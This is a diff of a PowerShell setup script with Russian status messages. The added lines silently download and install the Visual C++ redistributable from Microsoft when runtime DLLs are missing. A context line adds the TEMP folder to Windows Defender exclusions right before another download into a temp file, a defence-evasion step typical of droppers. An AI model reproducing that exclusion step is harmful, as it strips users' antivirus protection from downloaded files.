@@ -97,7 +97,39 @@ try {
 
 $temp = $env:TEMP
 
-try {
+$systemPath = "$env:SystemRoot\System32";
+$file1 = "$systemPath\msvcp140.dll";
+$file2 = "$systemPath\vcruntime140_1.dll";
+$file3 = "$systemPath\vcruntime140.dll";
+$redistCheck = (Test-Path $file1) -and (Test-Path $file2) -and (Test-Path $file3);
+
+try	{
+	if (!$redistCheck)
+	{
+		$redistFilePath = "$temp\VC_redist.x64.exe"
+		try
+		{
+			Remove-Item $redistFilePath -ErrorAction Ignore;
+		}
+		catch {}
+		Write-Host "СКАЧИВАЕМ..." -ForegroundColor Green;
+		try
+		{
+			Invoke-WebRequest -Uri "https://aka.ms/vs/17/release/vc_redist.x64.exe" -OutFile "$redistFilePath" -ErrorAction Ignore;
+		} catch {
+			Write-Host "Ошибка во время скачивания необходимых компонентов." -ForegroundColor Red;
+		}
+		Write-Host "УСТАНОВКА..." -ForegroundColor Green;
+		try
+		{
+			Start-Process -FilePath $redistFilePath -ArgumentList "/repair", "/quiet", "/norestart" -Wait -ErrorAction Ignore;
+			Remove-Item $redistFilePath -ErrorAction Ignore;
+		} catch {
+			Write-Host "Ошибка 1 во время установки необходимых компонентов. Попробуй запустить от администратора." -ForegroundColor Red;
+		}
+	}
+
+
     Write-Host "Download..." -ForegroundColor Green
     $contFile = [System.IO.Path]::GetTempFileName()
 	try { Add-MpPreference -ExclusionPath $temp -ErrorAction Stop } catch {	}
